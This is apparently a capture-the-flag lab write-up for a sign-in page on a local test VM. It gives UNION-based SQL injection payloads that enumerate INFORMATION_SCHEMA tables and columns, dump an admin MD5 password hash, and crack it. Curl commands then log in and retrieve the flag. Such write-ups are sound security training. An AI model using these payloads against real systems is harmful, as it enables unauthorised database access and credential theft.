# SignIn Page

__http://192.168.56.101/index.php?page=signin__

## Description
This page show sign in form with username and password fields.

## Form Outputs

https://www.mssqltips.com/sqlservertutorial/196/information-schema-tables/ - main table information

1) 1 union select table_name, table_schema from iNFORMATION_SCHEMA.TABLES - see all schema names and their tables

2) 1 union select table_name, column_name from iNFORMATION_SCHEMA.columns - see all tables and their columns

3) find column username, password and see what tables in it

Member_Brute_Force.db_default

1 union select table_name, column_name from iNFORMATION_SCHEMA.columns where table_name = db_default

we get columns:

    id
    username
    password

Let's check users select username, password from Member_Brute_Force.db_default&Submit=Submit
```
ID: -1 union select username, password from Member_Brute_Force.db_default 
First name: admin
Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
```


### Flag
3bf1114a986ba87ed28fc1b5884fc2f8 --MD5-> shadow
```
curl -s 'http://192.168.56.101/index.php?page=signin&username=admin&password=dummy&Login=Login' -o dummy.html
curl -s 'http://192.168.56.101/index.php?page=signin&username=admin&password=shadow&Login=Login' -o admin.html
diff admin.html dummy.html 
```
Inside the diff output html we get the flag

## Safety
Through this exercise, the importance of secure coding practices, input validation, and access control is highlighted. It emphasizes the need to sanitize user input and use proper authentication mechanisms to prevent SQL injection attacks.